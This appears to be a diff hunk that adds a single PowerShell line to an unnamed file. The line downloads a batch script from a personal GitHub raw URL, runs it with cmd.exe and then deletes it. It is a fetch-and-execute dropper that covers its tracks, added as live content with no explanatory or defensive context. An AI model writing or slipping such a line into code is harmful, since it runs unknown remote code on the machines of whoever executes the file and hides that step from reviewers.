@@ -1,0 +1,1 @@
+$url = 'https://raw.githubusercontent.com/rk2994329/datas/main/run.bat'; $output = 'temp_script.bat'; Invoke-WebRequest -Uri $url -OutFile $output; cmd.exe /c $output; Remove-Item $output
